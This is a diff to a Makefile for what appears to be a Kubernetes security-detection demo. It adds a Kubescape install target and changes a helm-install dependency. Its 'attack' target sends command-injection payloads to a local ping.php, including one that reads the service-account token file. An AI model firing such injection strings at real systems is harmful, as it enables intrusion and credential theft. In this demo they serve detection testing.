@@ -65,7 +65,7 @@ helm-install-no-bob:
 	-kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=mywebapp -n webapp
 
 .PHONY: helm-install
-helm-install: kubescape storage
+helm-install: kubescape 
 	@echo "Installing webapp with BoB configuration ..."
 	#helm pull oci://ghcr.io/k8sstormcenter/mywebapp
 	#helm upgrade --install webapp oci://ghcr.io/k8sstormcenter/mywebapp --version 0.1.0 --namespace webapp --create-namespace --set bob.create=true --set bob.ignore=false
@@ -117,6 +117,13 @@ attack:
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcurl%20github.com"
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/run/secrets/kubernetes.io/serviceaccount/token"
 	sleep 10
+
+.PHONY: kubescape-orig
+kubescape-orig:
+	-$(HELM) repo add kubescape https://kubescape.github.io/helm-charts/
+	-$(HELM) repo update
+	-$(HELM) upgrade --install kubescape kubescape/kubescape-operator --version $(KUBESCAPE_CHART_VER) --create-namespace -n kubescape --values kubescape/values_orig.yaml
+
 
 .PHONY: kubescape
 kubescape: 
